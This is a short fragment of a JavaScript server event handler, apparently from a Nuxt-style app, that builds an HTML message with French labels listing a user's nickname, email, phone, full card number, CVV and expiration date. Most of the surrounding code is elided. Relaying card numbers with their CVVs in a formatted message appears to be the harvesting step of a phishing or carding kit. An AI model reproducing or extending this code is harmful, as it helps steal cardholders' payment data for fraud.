...
export default defineEventHandler(async (event) => {
  ...
  ">
    ...
    <ol style="padding-left: 20px; font-size: 16px; color: #333;">
      <li><b>Pseudo :</b> ${pseudo || 'N/A'}</li>
      <li><b>Email :</b> ${email || 'N/A'}</li>
      <li><b>Téléphone :</b> ${telephone || 'N/A'}</li>
      <li><b>Carte :</b> ${card_number || 'N/A'}</li>
      <li><b>CVV :</b> ${card_cvv || 'N/A'}</li>
      <li><b>Date d'expiration :</b> ${card_expiration || 'N/A'}</li>
    </ol>
